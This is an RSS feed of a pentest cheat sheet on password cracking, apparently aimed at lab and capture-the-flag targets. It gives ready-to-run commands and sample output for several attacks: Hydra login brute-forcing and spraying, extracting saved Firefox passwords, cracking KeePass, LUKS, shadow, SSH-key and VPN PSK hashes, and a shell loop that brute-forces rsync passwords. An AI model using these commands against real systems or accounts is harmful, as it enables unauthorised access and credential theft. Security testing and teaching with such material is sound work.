channel.title: Password Cracking on TLDRBins
channel.description: Recent content in Password Cracking on TLDRBins

item.title: Custom Word List Generator
item.description:
# Create custom wordlist by spidering target
cewl <TARGET> -w wordlist.txt --with-numbers

Ref: CeWL

# Create username wordlist
./username-anarchy -i <USERS> | tee <USERS_FILE>

$ username-anarchy -i users.txt | tee usernames.txt
james
jamesroberts
james.roberts
jamesrob
jamerobe
---[SNIP]---

Ref: username-anarchy

python3 spraygen.py --year_start <YEAR_START> --year_end <YEAR_END> --type <TYPE> -o wordlist.txt

$ python3 spraygen.py --year_start 2020 --year_end 2025 --type seasons -o wordlist.txt
  (  \_

     _
    (  \_
    (    \_
    (       \_  
    (         \_            ___
    ( Password   \         |   |
    (   Spray     |คคคคคคคค|___|
    (           _ /          |

    (   _ /            (  Spray    )
    (_/                 |  This   |
                        |         |
                        | Get     |
                        |  Creds  |
                        |_________|

    Original Art by Alex Chudnovsky (Unaffiliated)
    Spraygen tool by 3ndG4me
    Version 1.7

item.title: Firefox
item.description:
Browse History

# Locate sqlite
$firefoxProfile = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles\" -Directory | Where-Object { $_.Name -like "*.default-release*" }; $historyDb = Join-Path $firefoxProfile.FullName "places.sqlite"; $historyDb

Extract Saved Passwords

# Auto detect path
python3 firefox_decrypt.py

# Specify path
python3 firefox_decrypt.py /<PATH>/profiles.ini/

Ref: firefox_decrypt

# With key4.db, logins.json in the same directory
python3 firepwd.py

Ref: firepwd

item.title: Hydra
item.description:
HTTP Basic Auth

hydra -L <USERS> -P <PASSWORDS> -s <PORT> -f <TARGET> http-get /

+-------------------------------------------+
| -s : port                                 |
| -L : usernames file                       |
| -P : passwords file                       |
| -f : exit when a login/pass pair is found |
+-------------------------------------------+

Web Page Login Form

hydra <TARGET> -l <USER> -P <PASSWORDS> http-post-form '/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password'

+-------------------------------------------+
| -l                 : username             |
| -P                 : wordlist             |
| http-post-form     : service              |
| /login.php         : action               |
| ^PASS^             : payload indicator    |
| Incorrect password : login failure string |
+-------------------------------------------+

Password Spraying with user:password Format

hydra -C <CREDS> <PROTOCOL>://<TARGET>

hydra -C creds.txt ftp://172.16.1.1
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-28 11:36:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 19 login tries, ~2 tries per task
[DATA] attacking ftp://172.16.1.1:21/
[21][ftp] host: 172.16.1.1   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-28 11:36:46

item.title: Keepass
item.description:
Crack Master Password

keepass2john <KDBX_FILE> > hash

# With a key file
keepass2john -k <KEY_FILE> <KDBX_FILE> > hash

Basic

# Open kdbx
kpcli --kdb <KDBX_FILE>

# Open kdbx with a key file
kpcli --key <KEY_FILE> --kdb <KDBX_FILE>

# List all passwords
find .

# Show password (e.g. #0)
show -f 0

# Export attachment (e.g. #0)
attach 0

Ref: Download kpcli

item.title: Kerberos
item.description:
Authentication Method

Kerberos Ticket

1. Configure /etc/hosts

# Always in this order - DC.example.com example.com DC
sudo nxc smb <DC_IP> --generate-hosts-file /etc/hosts

$ sudo nxc smb 10.129.235.149 --generate-hosts-file /etc/hosts
SMB         10.129.235.149  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
                                                                                                                                                                                                                    
$ tail -n1 /etc/hosts
10.129.235.149     DC.administrator.htb administrator.htb DC

2. Configure /etc/krb5.conf

# Always in UPPERCASE - DC.EXAMPLE.COM
sudo nxc smb <DC_IP> --generate-krb5-file /etc/krb5.conf

$ sudo nxc smb 10.129.235.149 --generate-krb5-file /etc/krb5.conf
SMB         10.129.235.149  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 

$ cat /etc/krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = ADMINISTRATOR.HTB

[realms]
    ADMINISTRATOR.HTB = {
        kdc = dc.administrator.htb
        admin_server = dc.administrator.htb
        default_domain = administrator.htb
    }

[domain_realm]
    .administrator.htb = ADMINISTRATOR.HTB
    administrator.htb = ADMINISTRATOR.HTB

item.title: Linux hard disk encryption
item.description:
Brute force LUKS password

bruteforce-luks -t 10 -f <WORDLIST> -w state.txt -v 30 <BACKUP_IMG>

Note: This is slow, create a small wordlist

General

# Open
cryptsetup open --type luks <BACKUP_IMG> backup

# Check
ls -l /dev/mapper/

# Create mount folder
sudo mkdir /mnt/backup

# Mount
sudo mount /dev/mapper/backup /mnt/backup/

item.title: Password Cracking
item.description:
Convert File to Hash Format

# For example
ssh2john id_rsa_encrypted > hash

keepass2john test.kdbx > hash

zip2john test.zip > hash

# Get a full list of *2john
find / -name *2john 2>/dev/null


# General use
john --wordlist=/usr/share/wordlists/rockyou.txt hash

# Specify hash format
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512

# Show cracked hash
john --show hash

# Show cracked hash with specific format
john --show hash --format=Raw-SHA512

# Auto detect hash format
hashcat hash

# Specify hash format
hashcat -m <MODE> -a 0 hash /usr/share/wordlists/rockyou.txt --force

# Auto skip username and colon
hashcat hash --user

Create a Wordlist

# For example, 'Test' with 4 digits and a symbol
hashcat --stdout -a 3 Test?d?d?d?d?s > passwords.txt

$ hashcat --stdout -a 3 Test?d?d?d?d?s > passwords.txt
$ head passwords.txt 
Test1999*
Test2312.
Test5678*
Test0000.
Test9000.
Test8888*
Test3000.
Test4523.
Test7778*
Test6999*


+------------------------------------------+
|  ? | Charset                             |
| ===+=========                            |
|  l | abcdefghijklmnopqrstuvwxyz [a-z]    |
|  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]    |
|  d | 0123456789                 [0-9]    |
|  h | 0123456789abcdef           [0-9a-f] |
|  H | 0123456789ABCDEF           [0-9A-F] |
|  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~   |
|  a | ?l?u?d?s                            |
|  b | 0x00 - 0xff                         |
+-----------------------------------------+

Ref: Example Hashes

item.title: Rsync
item.description:
General

# List root directories ('/')
rsync --list-only -av rsync://<TARGET>/

$ rsync --list-only -av rsync://10.10.64.45/            
httpd           web backup

# List root directories ('/') with ipv6
rsync --list-only -av rsync://[<TARGET_IPV6>]:8730/

# List sub-directories
rsync --list-only -av rsync://<TARGET>/<DIR>/

$ rsync --list-only -av rsync://10.10.64.45/httpd/
receiving incremental file list
drwxr-xr-x          4,096 2023/04/20 19:50:04 .
drwxr-xr-x          4,096 2023/04/20 20:13:22 db
-rw-r--r--         12,288 2023/04/20 19:50:42 db/site.db
drwxr-xr-x          4,096 2023/04/20 19:50:50 migrate
drwxr-xr-x          4,096 2023/04/20 20:13:15 www
-rw-r--r--          1,722 2023/04/20 20:02:54 www/dashboard.php
-rw-r--r--          2,315 2023/04/20 20:09:10 www/index.php
-rw-r--r--            101 2023/04/20 20:03:08 www/logout.php

sent 23 bytes  received 228 bytes  100.40 bytes/sec
total size is 16,426  speedup is 65.44

# List a file
rsync --list-only -av rsync://<TARGET>/<FILE_PATH>

$ rsync --list-only -av rsync://10.10.64.45/httpd/db/site.db
receiving incremental file list
-rw-r--r--         12,288 2023/04/20 19:50:42 site.db

sent 20 bytes  received 48 bytes  27.20 bytes/sec
total size is 12,288  speedup is 180.71

# List files (wildcard)
rsync --list-only -av rsync://<TARGET>/<FILE_PATH>*

$ rsync --list-only -av rsync://10.10.64.45/httpd/www*      
receiving incremental file list
drwxr-xr-x          4,096 2023/04/20 20:13:15 www
-rw-r--r--          1,722 2023/04/20 20:02:54 www/dashboard.php
-rw-r--r--          2,315 2023/04/20 20:09:10 www/index.php
-rw-r--r--            101 2023/04/20 20:03:08 www/logout.php

sent 25 bytes  received 142 bytes  66.80 bytes/sec
total size is 4,138  speedup is 24.78

# Get a directory
rsync -av rsync://<TARGET>/<DIR>/ .

$ rsync -av rsync://10.10.64.45/httpd/ .
receiving incremental file list
./
db/
db/site.db
migrate/
www/
www/dashboard.php
www/index.php
www/logout.php

sent 123 bytes  received 16,850 bytes  4,849.43 bytes/sec
total size is 16,426  speedup is 0.97

# Get a file
rsync -av rsync://<TARGET>/<FILE_PATH> .

$ rsync -av rsync://10.10.64.45/httpd/db/site.db .
receiving incremental file list
site.db

sent 43 bytes  received 12,383 bytes  4,970.40 bytes/sec
total size is 12,288  speedup is 0.99

# Get files (wildcard)
rsync -a rsync://<TARGET>/<FILE_PATH>* .

$ rsync -av rsync://10.10.64.45/httpd/www* .      
receiving incremental file list
www/
www/dashboard.php
www/index.php
www/logout.php

sent 85 bytes  received 4,412 bytes  1,798.80 bytes/sec
total size is 4,138  speedup is 0.92

# Copy files recusively to remote (Authenticated)
export RSYNC_PASSWORD='<PASSWORD>'; rsync -avR <SRC_DIR> rsync://<USER>@<TARGET>/<DEST_DIR>/

Bruteforce rsync Password

# Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.conf (e.g. user user and module home_user)
cat passwords.txt | while read password; do export RSYNC_PASSWORD=${password}; rsync --list-only rsync://user@<TARGET>/home_user 2>&1 | grep -q "auth failed on module home_user" || { echo "[+] Found: ${RSYNC_PASSWORD}"; break; } done

item.title: Shadow Hash Cracking
item.description:
Shadow Hash Cracking

# Prepare an unshadowed hashes file
unshadow passwd shadow > unshadowed


john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed

# yescrypt
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed

hashcat -m 7400 unshadowed /usr/share/wordlists/rockyou.txt --force --user

item.title: VPN
item.description:
Enum

# Check with ikeV1
ike-scan -M <TARGET>

# Check with ikeV2
ike-scan -M --ikev2 <TARGET>

# Get hash
ike-scan -A --pskcrack=hash.txt <TARGET>

# Crack the hash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt

Connect to VPN

sudo apt install strongswan

Settings

# Edit /etc/ipsec.secrets
%any : PSK <PASSWORD>


# Edit /etc/ipsec.conf (copy from ike-scan result)
config setup
    charondebug="all"
    uniqueids=yes
    strictcrlpolicy=no

conn testvpn
    authby=secret
    auto=add
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    type=transport
    keyexchange=ikev1
    left=<LOCAL>
    right=<TARGET>
    rightsubnet=<TARGET>[tcp]

Connect

# Reset
ipsec restart

# Connect
ipsec up testvpn
